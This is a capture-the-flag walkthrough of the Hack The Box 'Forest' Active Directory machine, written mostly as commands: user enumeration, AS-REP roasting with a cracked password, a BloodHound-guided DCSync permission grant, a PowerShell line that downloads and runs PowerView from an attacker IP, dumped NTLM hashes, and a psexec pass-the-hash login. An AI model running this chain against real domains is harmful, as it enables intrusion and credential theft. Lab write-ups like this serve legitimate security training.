Name & IP Address of Machine:
> FOREST : `10.10.10.161`
<!-- TOC -->

- [Synopsis](#synopsis)
- [Enumeration](#enumeration)
- [FootHold](#foothold)
- [Lateral Movement](#lateral-movement)
- [Privilege Escalation](#privilege-escalation)

<!-- /TOC -->



## Synopsis


## Enumeration
Opened Ports: 
- [ ] rpc,samba, ldap,ad.



## FootHold
- Enumerating rpcclient to enumerate users on machine.
    ```bash
    rpcclient -U '' -N htb.local -c 'enumdomusers; exit' > rpcclient.out
    cat rpcclient.out | cut -d '[' -f 2 | cut -d ']' -f 1 | sed -n '26,32p' > users.txt```
- Run GetNPUsers.py to get tgt ticket if any of these user has pre-auth set for kerberos.
   ```bash
    GetNPUsers.py -usersfile users.txt htb.local/
   ```
- Run hashcat to crack the hash.
  ```bash
    hashcat -m 18200 hash /opt/rockyou.txt
  ```
  `svc-alfresco:s3rvice`
- Log on to the box with win-rm
- Download sharphound and run bloodhound. or Run bloodhound-python from your attacker machine.
  ```bash
    bloodhound-python -u svc-alfresco@htb.local -p s3rvice -c all -ns 10.10.10.161 -d htb.local --zip
  ```
- Found out that svc-alfresco have permission:
  `The members of the group EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL have permissions to modify the DACL (Discretionary Access Control List) on the domain HTB.LOCAL. With write access to the target object's DACL, you can grant yourself any privilege you want on the object.`
- Create a new user or grant yourself dcsync permission 


## Lateral Movement

## Privilege Escalation

```bash
net user user-name password /add /domain
net group "Exchange Windows Permissions" /add user-name
$pass = ConvertTo-SecureString 'password' -AsPlainText -Force
# New-LocalUser "rahul" -Password $pass -FullName "Rahul Raj"
$cred = New-Object System.Management.Automation.PSCredential('HTB\user-name',$pass)
IEX(New-Object Net.WebClient).downloadString("http://10.10.14.28:8000/PowerView.ps1")
Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb,DC=local" -Rights DCSync -PrincipalIdentity user-name

```

```bash
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::                                                 
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                   
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::                                                                  
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::

```

```psexec.py
psexec.py -hashes 32693b11e6aa90eb43d32c72a07ceea6:32693b11e6aa90eb43d32c72a07ceea6 htb.local/administrator@10.10.10.161
```


<!-- ## Thank You 
🕉️  -->


<!-- ## Tools Used.
- [ ] . -->